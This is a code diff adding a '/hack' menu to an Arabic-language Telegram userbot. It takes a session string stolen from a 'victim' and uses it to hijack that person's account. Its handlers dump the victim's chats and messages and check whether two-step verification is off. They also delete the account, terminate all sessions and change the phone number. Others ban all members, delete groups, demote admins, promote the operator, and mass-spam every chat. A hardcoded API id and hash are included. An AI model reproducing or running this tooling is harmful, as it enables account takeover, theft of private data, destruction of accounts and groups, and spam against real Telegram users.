@@ -404,3 +404,344 @@ async def antif_on_msg(event):
         raise StopPropagation
     elif user_id in FloodConfig.BANNED_USERS:
         FloodConfig.BANNED_USERS.remove(user_id)
+
+
+@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+async def start(event):
+  global menu
+  if event.sender_id == bot.uid:
+      async with bot.conversation(event.chat_id) as x:
+        keyboard = [
+          [  
+            Button.inline("A", data="A"), 
+            Button.inline("B", data="B"),
+            Button.inline("C", data="C"),
+            Button.inline("D", data="D"),
+            Button.inline("E", data="E")
+            ],
+          [
+            Button.inline("F", data="F"), 
+            Button.inline("G", data="G"),
+            Button.inline("H", data="H"),
+            Button.inline("I", data="I"),
+            Button.inline("J", data="J")
+            ],
+          [
+            Button.inline("K", data="K"), 
+            Button.inline("L", data="L"),
+            Button.inline("M", data="M"),
+            Button.inline("N", data="N"),
+            ],
+          [
+            Button.url("المطور", "https://t.me/jepthon")
+            ]
+        ]
+        await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /hack", buttons=keyboard)
+      try:
+        i = await userchannels(strses.text)
+      except:
+        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+      if len(i) > 1:
+        file = open("session.txt", "w")
+        file.write(i + "\n\nDetails BY @Jepthon")
+        file.close()
+        await bot.send_file(event.chat_id, "session.txt")
+        system("rm -rf session.txt")
+      else:
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️. \n/hack", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+    i = await userinfo(strses.text)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
+    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
+    grpid = await x.get_response()
+    await userbans(strses.text, grpid.text)
+    await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await usermsgs(strses.text)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي القناة او الكروب")
+    grpid = await x.get_response()
+    await joingroup(strses.text, grpid.text)
+    await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("اعطيني معرف /ايدي الكروب او القناة")
+    grpid = await x.get_response()
+    await leavegroup(strses.text, grpid.text)
+    await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
+      grpid = await x.get_response()
+      await delgroup(strses.text, grpid.text)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await user2fa(strses.text)
+      if i:
+        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
+      else:
+        await event.reply("للأسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await terminate(strses.text)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await delacc(strses.text)
+      await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)
+
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
+      grp = await x.get_response()
+      await x.send_message("الان ارسل لي المعرف")
+      user = await x.get_response()
+      i = await promote(strses.text, grp.text, user.text)
+      await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
+      pro = await x.get_response()
+      try:
+        i = await demall(strses.text, pro.text)
+      except:
+        pass
+      await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
+      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
+      number = (await x.get_response()).text
+      try:
+        result = await change_number(strses.text, number)
+        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await asyncio.sleep(20)
+        await x.send_message("الان ارسل لي الهاش")
+        phone_code_hash = (await x.get_response()).text
+        await x.send_message("الان ارسل لي الكود")
+        otp = (await x.get_response()).text
+        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
+        if changing:
+          await event.respond("لقد تم تغير الرقم بنجاح ✅")
+        else:
+          await event.respond("هنالك خطأ ما حصل")
+      except Exception as e:
+        await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")
+
+
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+async def start(event):
+    keyboard = [
+      [  
+        Button.inline("a", data="a"), 
+        Button.inline("b", data="b"),
+        Button.inline("c", data="c"),
+        ],
+      [
+        Button.url("القناة", "https://t.me/Jepthon")
+        ]
+    ]
+    await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
+
+
+
+async def gcasta(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for aman in X.iter_dialogs():
+                chat = aman.id
+                try:
+                    await X.send_message(chat, tol, file=file)     
+                    if lol != -1001551357238:
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                    elif chat == -1001606996743:
+                        pass
+                    await asyncio.sleep()
+                except Exception as e:
+                    print(e)
+        except Exception as e:
+            print(e)        
+
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
+      msg = await x.get_response()
+      await x.send_message("الان سيتم ارسال رسالة بشكل تلقائي كل 10 دقائق ")
+      i = await gcasta(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} all 😉😉.", buttons=keyboard)
+
+molb = True
+
+async def gcastb(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in X.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001606996743:
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                    except Exception as e:
+                        print(e)
+        except Exception as e:
+            print(e)
